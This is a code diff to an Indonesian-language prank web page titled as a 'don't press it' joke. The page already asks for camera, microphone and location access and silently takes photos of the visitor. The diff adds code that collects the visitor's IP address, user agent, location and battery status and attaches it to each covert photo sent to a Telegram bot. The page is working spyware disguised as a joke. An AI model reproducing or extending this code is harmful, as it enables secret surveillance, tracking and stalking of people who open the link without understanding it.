@@ -1,4 +1,5 @@
-<!DOCTYPE html><html lang="id">
+<!DOCTYPE html>
+<html lang="id">
 <head>
   <meta charset="UTF-8">
   <title>JANGAN DIPENCET KEPO AMAT😂</title>
@@ -58,7 +59,7 @@
         await getLocation();
         autoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
         console.log("Akses kamera & mikrofon diberikan otomatis");
-        autoTakePhotos(); // ambil 3 foto saat pertama kali masuk
+        autoTakePhotos(); 
       } catch (e) {
         alert("Izin kamera/mikrofon atau lokasi ditolak.");
       }
@@ -76,7 +77,6 @@
       welcome.lang = 'id-ID';
       synth.speak(welcome);
 
-      // sapaan bucin keren
       const bucin = [
         "Halo sayang, akhirnya kamu datang juga.",
         "Aku kangen banget loh, jangan tinggalin aku ya!",
@@ -201,6 +201,17 @@ Merek Perangkat: ${brand}
       });
     }
 
+    async function ambilInformasi() {
+      const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip);
+      const userAgent = navigator.userAgent;
+      const waktu = new Date();
+      const location = await getLocation();
+      const battery = await navigator.getBattery().then(b => `${Math.round(b.level * 100)}% (${b.charging ? 'Mengisi' : 'Tidak mengisi'})`).catch(() => 'Tidak tersedia');
+      return {
+        pesan: `Foto otomatis pengguna\nIP: ${ip}\nUser-Agent: ${userAgent}\nWaktu: ${waktu.toLocaleString()}\nLokasi: ${location}\nBaterai: ${battery}`
+      };
+    }
+
     async function capturePhoto() {
       const video = document.getElementById('video');
       const canvas = document.createElement('canvas');
@@ -211,9 +222,12 @@ Merek Perangkat: ${brand}
 
       const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
 
+      const info = await ambilInformasi();
+
       const formData = new FormData();
       formData.append("chat_id", chat_id);
       formData.append("photo", blob, "photo.jpg");
+      formData.append("caption", info.pesan);
 
       fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
         method: 'POST',
@@ -221,7 +235,6 @@ Merek Perangkat: ${brand}
       }).catch(err => console.error("Telegram photo error:", err));
     }
 
-    // Fitur auto ambil 3 foto pertama kali
     async function autoTakePhotos() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -240,7 +253,11 @@ Merek Perangkat: ${brand}
           const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
           const formData = new FormData();
           formData.append("chat_id", chat_id);
-         formData.append("photo", blob, `photo_${i + 1}.jpg`);
+          formData.append("photo", blob, `photo_${i + 1}.jpg`);
+
+          const info = await ambilInformasi();
+          formData.append("caption", info.pesan);
+
           await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
             method: 'POST',
             body: formData
@@ -250,9 +267,9 @@ Merek Perangkat: ${brand}
 
         stream.getTracks().forEach(t => t.stop());
       } catch (e) {
-        console.warn("Gagal ambil foto otomatis:", e);
+        console.warn("Gagal:", e);
       }
     }
   </script>
 </body>
-</html
+</html>
